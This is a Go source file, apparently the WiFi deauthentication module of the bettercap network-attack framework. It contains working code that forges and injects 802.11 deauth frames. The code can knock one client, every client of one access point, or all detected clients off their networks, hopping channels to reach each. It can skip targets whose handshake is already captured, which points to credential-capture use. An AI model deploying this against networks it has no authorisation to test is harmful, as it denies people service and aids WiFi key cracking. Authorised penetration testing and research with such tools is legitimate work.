package wifi

import (
	"bytes"
	"fmt"
	"net"
	"sort"
	"time"

	"github.com/bettercap/bettercap/network"
	"github.com/bettercap/bettercap/packets"
)

func (mod *WiFiModule) injectPacket(data []byte) {
	if err := mod.handle.WritePacketData(data); err != nil {
		mod.Error("could not inject WiFi packet: %s", err)
		mod.Session.Queue.TrackError()
	} else {
		mod.Session.Queue.TrackSent(uint64(len(data)))
	}
	// let the network card breath a little
	time.Sleep(10 * time.Millisecond)
}

func (mod *WiFiModule) sendDeauthPacket(ap net.HardwareAddr, client net.HardwareAddr) {
	for seq := uint16(0); seq < 64 && mod.Running(); seq++ {
		if err, pkt := packets.NewDot11Deauth(ap, client, ap, seq); err != nil {
			mod.Error("could not create deauth packet: %s", err)
			continue
		} else {
			mod.injectPacket(pkt)
		}

		if err, pkt := packets.NewDot11Deauth(client, ap, ap, seq); err != nil {
			mod.Error("could not create deauth packet: %s", err)
			continue
		} else {
			mod.injectPacket(pkt)
		}
	}
}

func (mod *WiFiModule) skipDeauth(to net.HardwareAddr) bool {
	for _, mac := range mod.deauthSkip {
		if bytes.Equal(to, mac) {
			return true
		}
	}
	return false
}

func (mod *WiFiModule) isDeauthSilent() bool {
	if err, is := mod.BoolParam("wifi.deauth.silent"); err != nil {
		mod.Warning("%v", err)
	} else {
		mod.deauthSilent = is
	}
	return mod.deauthSilent
}

func (mod *WiFiModule) doDeauthOpen() bool {
	if err, is := mod.BoolParam("wifi.deauth.open"); err != nil {
		mod.Warning("%v", err)
	} else {
		mod.deauthOpen = is
	}
	return mod.deauthOpen
}

func (mod *WiFiModule) doDeauthAcquired() bool {
	if err, is := mod.BoolParam("wifi.deauth.acquired"); err != nil {
		mod.Warning("%v", err)
	} else {
		mod.deauthAcquired = is
	}
	return mod.deauthAcquired
}

func (mod *WiFiModule) startDeauth(to net.HardwareAddr) error {
	// parse skip list
	if err, deauthSkip := mod.StringParam("wifi.deauth.skip"); err != nil {
		return err
	} else if macs, err := network.ParseMACs(deauthSkip); err != nil {
		return err
	} else {
		mod.deauthSkip = macs
	}

	// if not already running, temporarily enable the pcap handle
	// for packet injection
	if !mod.Running() {
		if err := mod.Configure(); err != nil {
			return err
		}
		defer mod.handle.Close()
	}

	type flow struct {
		Ap     *network.AccessPoint
		Client *network.Station
	}

	toDeauth := make([]flow, 0)
	isBcast := network.IsBroadcastMac(to)
	for _, ap := range mod.Session.WiFi.List() {
		isAP := bytes.Equal(ap.HW, to)
		for _, client := range ap.Clients() {
			if isBcast || isAP || bytes.Equal(client.HW, to) {
				if !mod.skipDeauth(ap.HW) && !mod.skipDeauth(client.HW) {
					toDeauth = append(toDeauth, flow{Ap: ap, Client: client})
				} else {
					mod.Debug("skipping ap:%v client:%v because skip list %v", ap, client, mod.deauthSkip)
				}
			}
		}
	}

	if len(toDeauth) == 0 {
		if isBcast {
			return nil
		}
		return fmt.Errorf("%s is an unknown BSSID, is in the deauth skip list, or doesn't have detected clients.", to.String())
	}

	mod.writes.Add(1)
	go func() {
		defer mod.writes.Done()

		// since we need to change the wifi adapter channel for each
		// deauth packet, let's sort by channel so we do the minimum
		// amount of hops possible
		sort.Slice(toDeauth, func(i, j int) bool {
			return toDeauth[i].Ap.Channel < toDeauth[j].Ap.Channel
		})

		// send the deauth frames
		for _, deauth := range toDeauth {
			client := deauth.Client
			ap := deauth.Ap
			if mod.Running() {
				logger := mod.Info
				if mod.isDeauthSilent() {
					logger = mod.Debug
				}

				if ap.IsOpen() && !mod.doDeauthOpen() {
					mod.Debug("skipping deauth for open network %s (wifi.deauth.open is false)", ap.ESSID())
				} else if ap.HasKeyMaterial() && !mod.doDeauthAcquired() {
					mod.Debug("skipping deauth for AP %s (key material already acquired)", ap.ESSID())
				} else {
					logger("deauthing client %s from AP %s (channel:%d encryption:%s)", client.String(), ap.ESSID(), ap.Channel, ap.Encryption)

					mod.onChannel(ap.Channel, func() {
						mod.sendDeauthPacket(ap.HW, client.HW)
					})
				}
			}
		}
	}()

	return nil
}